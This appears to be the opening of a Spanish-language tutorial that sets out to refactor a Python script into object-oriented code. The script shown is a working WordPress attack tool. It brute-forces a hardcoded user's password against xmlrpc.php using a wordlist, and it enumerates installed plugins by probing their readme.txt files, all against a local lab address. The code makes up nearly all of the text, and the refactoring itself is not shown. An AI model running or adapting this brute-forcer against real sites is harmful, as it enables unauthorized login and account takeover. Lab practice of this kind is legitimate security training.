Lo que haremos hoy será convertir el código siguiente en programación orientada a objectos:

````python
import sys
import requests


def bruteforce():
    url = 'http://172.17.0.2/wordpress/xmlrpc.php'
    username = 'luisillo'
    rockyou_path = 'diccionario.txt'

    with open(rockyou_path, 'r', encoding='latin-1') as file:
        passwords = file.readlines()

    for password in passwords:
        password = password.strip()
        xml_payload = f"""<?xml version="1.0" encoding="UTF-8"?>
        <methodCall>
            <methodName>wp.getUsersBlogs</methodName>
            <params>
                <param><value>{username}</value></param>
                <param><value>{password}</value></param>
            </params>
        </methodCall>"""

        print(f"[+] Probamos con la contraseña {password}")
        response = requests.post(url, data=xml_payload)

        if 'incorrectos.' not in response.text:
            print(f"[+] La contraseña del usuario {username} es {password}")
            sys.exit(0)


def plugin_enumeration():
    plugins = (
        "jetpack",
        "akismet",
        "contact-form-7",
        "woocommerce",
        "wordfence",
        "yoast-seo",
        "elementor",
        "w3-total-cache",
        "updraftplus",
        "wpforms",
        "wpmu-dev-forminator"
        #resto de plugins
    )

    base_url = "http://172.17.0.2/wordpress/wp-content/plugins/"

    for plugin in plugins:
        url = f"{base_url}{plugin}/readme.txt"
        response = requests.get(url)
        
        if response.status_code == 200:
            print(f"[+] Plugin encontrado: {plugin}")


choice = input("Introduce 1 para ejecutar la función 'bruteforce' o 2 para ejecutar 'plugin_enumeration': ")

if choice == '1':
    bruteforce()
elif choice == '2':
    plugin_enumeration()
else:
    print("Opción no válida.")
`````

...